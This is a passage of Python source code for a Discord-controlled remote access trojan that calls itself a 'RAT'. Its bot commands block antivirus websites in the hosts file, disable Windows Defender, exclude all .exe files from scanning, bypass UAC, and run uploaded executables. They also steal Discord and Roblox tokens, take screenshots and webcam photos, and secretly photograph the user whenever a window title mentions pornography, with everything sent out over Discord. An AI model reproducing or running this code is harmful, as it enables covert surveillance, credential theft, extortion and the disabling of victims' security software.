                    description="The process has been made non-critical. It can now be safely closed without causing a BSOD.",
                    color=0xFF69B4
                )
            else:
                embed = discord.Embed(
                    title="❌ Error",
                    description="Failed to mark the process as non-critical.",
                    color=0xFF0000
                )
        else:
            if make_critical():
                embed = discord.Embed(
                    title="⚠️ Critical Process",
                    description="The process has been made critical. Closing it will cause a BSOD!",
                    color=0xFF69B4
                )
            else:
                embed = discord.Embed(
                    title="❌ Error",
                    description="Failed to mark the process as critical.",
                    color=0xFF0000
                )

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {e}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def nostartup(ctx):
    if not is_admin:
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )
        await ctx.send(embed=embed)
        return

    username = os.getlogin()
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )

    test_file = os.path.join(startup_folder, "test_permission.tmp")
    try:
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        blocked = False
    except PermissionError:
        blocked = True
    except Exception as e:
        await ctx.send(f"❗ Error while checking permissions: ```{e}```")
        return

    try:
        if blocked:
            command = f'icacls "{startup_folder}" /remove:d {username}'
            result = subprocess.run(command, shell=True, capture_output=True)
            if result.returncode == 0:
                embed = discord.Embed(
                    title="🔓 Startup Folder Unblocked",
                    description=f"Successfully restored access to the Startup folder for user **{username}**.",
                    color=0xFF69B4
                )
            else:
                embed = discord.Embed(
                    title="❗ Error",
                    description=f"Failed to unblock the Startup folder:\n```{result.stderr.decode()}```",
                    color=0xFF0000
                )
        else:
            command = f'icacls "{startup_folder}" /deny {username}:F'
            result = subprocess.run(command, shell=True, capture_output=True)
            if result.returncode == 0:
                embed = discord.Embed(
                    title="🔒 Startup Folder Blocked",
                    description=f"Successfully blocked access to the Startup folder for user **{username}**.",
                    color=0xFF69B4
                )
            else:
                embed = discord.Embed(
                    title="❗ Error",
                    description=f"Failed to block the Startup folder:\n```{result.stderr.decode()}```",
                    color=0xFF0000
                )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the command:\n```{e}```",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def unblocklist(ctx):
    try:
        hostfilepath = os.path.join(
            os.getenv('systemroot'),
            os.sep.join(
                subprocess.run(
                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
                    shell=True, capture_output=True
                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]
            ),
            'hosts'
        )
        with open(hostfilepath) as file:
            data = file.readlines()
    except Exception as e:
        await ctx.send(f"Error: {e}")
        return

    BANNED_URLs = (
            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
    )

    newdata = []
    for line in data:
        if not any(url in line and ("127.0.0.1" in line or "::1" in line) for url in BANNED_URLs):
            newdata.append(line)

    newdata = ''.join(newdata).replace('\n\n', '\n')

    try:
        subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
        with open(hostfilepath, 'w') as file:
            file.write(newdata)
        subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)

        embed = discord.Embed(
            title="🔓 Unblocklist",
            description="Succesfully unblocked all common AV sites!",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")
        return

@bot.command()
async def blocklist(ctx):
    loop = asyncio.get_event_loop()
    
    def blocklist_task():
        try:
            hostfilepath = os.path.join(os.getenv('systemroot'), os.sep.join(
                subprocess.run(
                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
                    shell=True, capture_output=True
                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]), 'hosts')
            
            with open(hostfilepath) as file:
                data = file.readlines()
        except Exception as e:
            return "Error"

        BANNED_URLs = (
            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
        )

        newdata = data[:]
        for url in BANNED_URLs:
            entry = f"127.0.0.1 {url}\n"
            if not any([url in line for line in data]):
                newdata.append(entry)

        newdata = ''.join(newdata)

        try:
            subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)
        except Exception as e:
            return "Error"

        return "Success"

    result = await loop.run_in_executor(executor, blocklist_task)

    if result == "Success":
        embed = discord.Embed(
            title="🦠 Blocklist",
            description="Successfully blocked access to all common AV sites",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send("An error occurred while updating the blocklist.")

@bot.command()
async def windef(ctx, process: str = "disable"):
    if is_admin():
        try:
            await windis()
            embed = discord.Embed(
                title="✅ Success on Disabling!",
                description="Successfully disabled Windows Defender! (May need restart!) 🛡",
                color=0xFF69B4
            )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Failed to disable!",
                description=f"Error occurred: `{e}`",
                color=0xFF0000
            )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )
        await ctx.send(embed=embed)

@bot.command()
async def exclude_exe(ctx):
    if is_admin():
        try:
            ps_command = "Add-MpPreference -ExclusionExtension '.exe'"
            subprocess.run(["powershell", "-Command", ps_command], check=True)

            embed = discord.Embed(
                title="✅ .exe Exclusion Added",
                description="Successfully added the .exe exclusion to Windows Defender.",
                color=0xFF69B4
            )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Failed to Add Exclusion",
                description=f"Error occurred: `{e}`",
                color=0xFF0000
            )
    else:
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )

    await ctx.send(embed=embed)

@bot.command()
async def download(ctx, filename: str):
    global current_directory

    try:
        file_path = os.path.join(current_directory, filename)

        if os.path.exists(file_path) and os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
            embed = discord.Embed(
                title="📤 File Sent",
                description=f"Successfully sent the file: {filename}",
                color=0xFF69B4
            )
        else:
            embed = discord.Embed(
                title="❌ File Send Error",
                description=f"File not found: {filename} in {current_directory}",
                color=0xff0000
            )
    except Exception as e:
        embed = discord.Embed(
            title="❌ File Send Error",
            description=f"An error occurred while sending the file: {str(e)}",
            color=0xff0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def upload(ctx, path: str = None):
    try:
        if not path:
            path = os.environ.get("TEMP", os.getcwd())

        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]

            file_path = os.path.join(path, attachment.filename)

            await attachment.save(file_path)

            embed = discord.Embed(
                title="✅ File Downloaded Successfully",
                description=f"File '{attachment.filename}' has been downloaded to '{file_path}'.",
                color=0xFF69B4
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ No Attachment Found",
                description="No attachment found in the message. Please attach a file to upload.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def exec(ctx, path: str):
    try:
        path = path.replace("\\", "\\\\")
        if path.endswith('.exe'):
            subprocess.run(['cmd', '/c', 'start', path], check=True)
            embed = discord.Embed(
                title="✅ File Executed Successfully",
                description=f"Executable file '{path}' has been run.",
                color=0xFF69B4
            )
            await ctx.send(embed=embed)
        
        elif path.endswith(('.png', '.jpg', '.jpeg', '.gif')):
            subprocess.run(['start', path], check=True, shell=True)
            embed = discord.Embed(
                title="✅ File Opened Successfully",
                description=f"Image file '{path}' has been opened.",
                color=0xFF69B4
            )
            await ctx.send(embed=embed)
        
        else:
            embed = discord.Embed(
                title="❌ Unsupported File Type",
                description=f"Cannot execute or open file of type '{path}'.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ File Failed to Run",
            description=f"An error occurred: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)


@bot.command()
async def cd(ctx, path: str = None):
    global current_directory

    try:
        if path is None:
            embed = discord.Embed(
                title="📂 Current Directory",
                description=f"The current working directory is: {current_directory}",
                color=0xFF69B4
            )
        elif path == "..":
            parent_directory = os.path.dirname(current_directory)
            current_directory = parent_directory
            embed = discord.Embed(
                title="🛠️ CD Command",
                description=f"Moved up one directory to: {current_directory}",
                color=0xFF69B4
            )
        else:
            new_path = os.path.join(current_directory, path)

            if os.path.isdir(new_path):
                current_directory = new_path
                embed = discord.Embed(
                    title="🛠️ CD Command",
                    description=f"Successfully changed directory to: {current_directory}",
                    color=0xFF69B4
                )
            else:
                embed = discord.Embed(
                    title="❌ CD Command Error",
                    description=f"Directory not found: {path}",
                    color=0xff0000
                )
    except Exception as e:
        embed = discord.Embed(
            title="❌ CD Command Error",
            description=f"An error occurred while changing directory: {str(e)}",
            color=0xff0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def list(ctx):
    global current_directory

    try:
        files = os.listdir(current_directory)

        if not files:
            files = ["No files or directories found."]
        
        items_per_page = 10
        total_files = len(files)
        total_pages = math.ceil(total_files / items_per_page)

        current_page = 1

        def create_embed(page):
            start = (page - 1) * items_per_page
            end = min(start + items_per_page, total_files)
            file_list = files[start:end]

            embed = discord.Embed(
                title="📂 File List",
                description=f"Files in {current_directory} (Page {page}/{total_pages}):",
                color=0xFF69B4
            )
            embed.add_field(name="Files", value="\n".join(file_list), inline=False)
            return embed

        embed = create_embed(current_page)
        message = await ctx.send(embed=embed)

        if total_pages > 1:
            await message.add_reaction("⬅️")
            await message.add_reaction("➡️")

        def check(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ["⬅️", "➡️"] and reaction.message.id == message.id

        while True:
            try:
                reaction, user = await bot.wait_for('reaction_add', timeout=10, check=check)

                if str(reaction.emoji) == "➡️" and current_page < total_pages:
                    current_page += 1
                elif str(reaction.emoji) == "⬅️" and current_page > 1:
                    current_page -= 1

                new_embed = create_embed(current_page)
                await message.edit(embed=new_embed)
                await message.remove_reaction(reaction.emoji, user)

            except asyncio.TimeoutError:
                await message.clear_reactions()
                break

    except Exception as e:
        embed = discord.Embed(
            title="❌ List Command Error",
            description=f"An error occurred while listing the files: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def uacbypass(ctx):
    result = byp()

    if result == "admina":
        embed = discord.Embed(
            title="Success",
            description="Already admin.",
            color=0xFF69B4
        )
    elif result == "worked":
        embed = discord.Embed(
            title="Success",
            description="UAC Bypass executed successfully.",
            color=0xFF69B4
        )
    else:
        embed = discord.Embed(
            title="Failure",
            description=f"UAC Bypass failed: {result}",
            color=0xFF0000
        )

    await ctx.send(embed=embed)

    if result == "success":
        sys.exit()

@bot.command()
async def getadmin(ctx):
    if is_admin():
        embed = discord.Embed(
            title="Success", 
            description="The user already has admin privileges.",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        return
    else:
        decline_count = 0

        if trigger_uac():
            embed = discord.Embed(
                title="Success", 
                description="The script has been elevated to admin privileges.",
                color=0xFF69B4
            )
        else:
            embed = discord.Embed(
                title="Failure", 
                description="UAC was not granted. The operation was canceled or failed.",
                color=0xFF0000
            )
            
            while not trigger_uac():
                decline_count += 1

            embed = discord.Embed(
                title="Success", 
                description=f"The script has been elevated to admin privileges after {decline_count} declined attempts.",
                color=0xFF69B4
            )
            
        await ctx.send(embed=embed)
        exit()

@bot.command()
async def admin(ctx):
    if is_admin():
        embed = discord.Embed(
            title="🌷 Admin-Check",
            description="RAT has **full admin permissions**!",
            color=0xFF69B4,
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )
        await ctx.send(embed=embed)

@bot.command()
async def token(ctx):
    await tokenoutput(ctx)

@bot.command()
async def roblox(ctx):
    await robloxoutput(ctx)

@bot.command()
async def screenshot(ctx):
    try:
        tmp = os.path.join(os.environ["TEMP"], "hzzh.png")
        pyautogui.screenshot(tmp)

        embed = discord.Embed(
            title="📸 Screenshot",
            description="Screenshot taken successfully!",
            color=0xFF69B4,
        )
        embed.set_image(url="attachment://hzzh.png")
        file = discord.File(tmp, filename="hzzh.png")
        await ctx.send(embed=embed, file=file)
    except Exception as e:
        await ctx.send(f"Failed to take screenshot: {e}")

@bot.command()
async def webcam(ctx):
    try:
        tmp = os.path.join(os.environ["TEMP"], "webc.png")

        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            embed = discord.Embed(
                title="📸 Webcam",
                description="Could not access webcam!",
                color=0xFF0000,
            )
            await ctx.send(embed=embed)
            return

        cv2.imwrite(tmp, frame)

        embed = discord.Embed(
            title="📸 Webcam",
            description="Webcam-Screenshot taken successfully!",
            color=0xFF69B4,
        )
        embed.set_image(url="attachment://webc.png")
        file = discord.File(tmp, filename="webc.png")
        await ctx.send(embed=embed, file=file)
    except Exception as e:
        await ctx.send(f"Failed to capture webcam: {e}")

async def autosteal(channel):
    try:
        await tokenoutput(channel)
        await robloxoutput(channel)
    except Exception as e:
        print(f"Error during auto-steal! \n {e}")

def wtitles():
    titles = []
    def callback(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd)
            if title:
                titles.append(title.lower())
    win32gui.EnumWindows(callback, None)
    return titles

def pornsearch(channel, bot_loop):
    def monitor():
        sent = False
        while True:
            titles = wtitles()
            if any("porn" in title for title in titles):
                if not sent:
                    tmp = os.path.join(os.environ["TEMP"], "webc_thread.png")
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    cap.release()

                    if ret:
                        cv2.imwrite(tmp, frame)

                        async def send_webcam_image():
                            file = discord.File(tmp, filename="webc_thread.png")
                            embed = discord.Embed(
                                title="📸 Webcam - NSFW detected!",
                                description="Porn detected in browser window title.",
                                color=0xFF69B4
                            )
                            embed.set_image(url="attachment://webc_thread.png")
                            await channel.send(embed=embed, file=file)

                        asyncio.run_coroutine_threadsafe(send_webcam_image(), bot_loop)
                    else:
                        asyncio.run_coroutine_threadsafe(channel.send("Porn detected but could not access webcam."), bot_loop)

                    sent = True
            else:
                sent = False
            time.sleep(5)

    thread = threading.Thread(target=monitor, daemon=True)
    thread.start()

@bot.command()
@commands.has_permissions(manage_channels=True)
async def clear(ctx):
    ch = ctx.channel
    guild = ctx.guild

    await ch.delete()
    await guild.create_text_channel(ch.name)

if AutoStartup:
    startup()
wait_for_wifi()
bot.run(HzzH)
